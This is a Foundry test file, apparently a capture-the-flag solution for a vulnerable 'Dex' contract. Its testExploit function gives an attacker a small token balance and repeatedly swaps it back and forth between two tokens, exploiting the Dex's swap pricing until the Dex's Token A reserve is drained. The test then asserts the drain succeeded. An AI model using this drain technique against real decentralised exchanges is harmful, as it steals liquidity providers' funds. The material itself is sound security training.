// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Swap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    SwappableToken public swappabletokenA;
    SwappableToken public swappabletokenB;
    Dex public dex;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!
    function setUp() public {
        dex = new Dex();
        swappabletokenA = new SwappableToken(address(dex), "SwapA", "SWA", 110);
        vm.label(address(swappabletokenA), "Token A");
        swappabletokenB = new SwappableToken(address(dex), "SwapB", "SWB", 110);
        vm.label(address(swappabletokenB), "Token B");
        dex.setTokens(address(swappabletokenA), address(swappabletokenB));

        // Approve and add liquidity
        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletokenA), 100);
        dex.addLiquidity(address(swappabletokenB), 100);

        // Transfer initial tokens to attacker
        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);

        vm.label(attacker, "Attacker");
    }

    function testExploit() public {
        vm.startPrank(attacker);

        console.log("=== Attack Start ===");
        console.log("Attacker Token A Balance:", swappabletokenA.balanceOf(attacker));
        console.log("Attacker Token B Balance:", swappabletokenB.balanceOf(attacker));

        // Attacker approves the Dex to swap tokens
        swappabletokenA.approve(address(dex), type(uint256).max);
        swappabletokenB.approve(address(dex), type(uint256).max);

        while (swappabletokenA.balanceOf(address(dex)) > 0) {
    uint256 swapAmount = swappabletokenA.balanceOf(attacker);

    if (swapAmount > swappabletokenA.balanceOf(address(dex))) {
        swapAmount = swappabletokenA.balanceOf(address(dex));
    }

    // Swap Token A -> Token B
    dex.swap(address(swappabletokenA), address(swappabletokenB), swapAmount);
    console.log("Swapped A -> B");

    swapAmount = swappabletokenB.balanceOf(attacker);

    if (swapAmount > swappabletokenB.balanceOf(address(dex))) {
        swapAmount = swappabletokenB.balanceOf(address(dex));
    }

    // Swap Token B -> Token A
    dex.swap(address(swappabletokenB), address(swappabletokenA), swapAmount);
    console.log("Swapped B -> A");
}


        console.log("=== Attack Complete ===");
        console.log("Attacker Final Token A Balance:", swappabletokenA.balanceOf(attacker));
        console.log("DEX Final Token A Balance:", swappabletokenA.balanceOf(address(dex)));
        console.log("DEX Final Token B Balance:", swappabletokenB.balanceOf(address(dex)));

        vm.stopPrank();

        // Ensure the attacker successfully drained Token A
        assertEq(swappabletokenA.balanceOf(address(dex)), 0, "DEX should have 0 Token A");
        assertGt(swappabletokenA.balanceOf(attacker), 100, "Attacker should have all Token A");
    }
}
